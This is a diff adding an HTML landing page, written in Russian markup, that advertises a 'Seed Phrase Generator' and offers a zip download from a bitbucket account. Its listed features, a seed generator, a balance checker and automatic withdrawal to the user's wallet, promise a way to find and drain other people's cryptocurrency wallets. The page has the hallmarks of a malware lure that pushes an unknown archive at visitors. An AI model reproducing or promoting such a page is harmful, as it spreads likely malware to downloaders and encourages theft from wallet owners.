@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Seed Phrase Generator</title>
+    <meta name="description" content="Download Seed Phrase Generator">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: #fff;
+            text-align: center;
+            font-family: 'Roboto', sans-serif; 
+            background: linear-gradient(135deg, #ffffff, #cccccc, #0077cc); 
+            background-size: 400% 400%; 
+            animation: gradient-animation 15s ease infinite; 
+        }
+
+        @keyframes gradient-animation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            position: relative;
+            z-index: 1;
+        }
+
+        .download-button {
+            padding: 15px 30px;
+            font-size: 1.5em;
+            border: none;
+            border-radius: 5px;
+            background-color: #4CAF50; 
+            color: white;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 0 5px rgba(76, 175, 80, 0.8), 0 0 10px rgba(76, 175, 80, 0.8), 0 0 15px rgba(76, 175, 80, 0.8); 
+        }
+
+        .download-button:hover {
+            background-color: #45a049; /* Непрозрачный цвет фона при наведении */
+            box-shadow: 0 0 10px rgba(69, 160, 73, 1), 0 0 20px rgba(69, 160, 73, 1), 0 0 30px rgba(69, 160, 73, 1); 
+        }
+
+        h2 {
+            margin-top: 20px;
+            font-size: 1.5em;
+            position: relative;
+            z-index: 1;
+        }
+
+        ul {
+            list-style-type: none; 
+            padding: 0; 
+            margin-top: 10px; 
+            font-size: 1.2em; 
+        }
+
+        li {
+            margin: 5px 0; 
+        }
+    </style>
+</head>
+<body>
+    <h1>Seed Phrase Generator</h1>
+    <a href="https://bitbucket.org/trafficbinghub/crypto/downloads/Seed_Phrase_Generator.zip" class="download-button">Download</a>
+    <h2>Features:</h2>
+    <ul>
+        <li>Seed Generator</li>
+        <li>Balance Checker</li>
+        <li>Auto withdrawal to your wallet</li>
+    </ul>
+</body>
+</html>
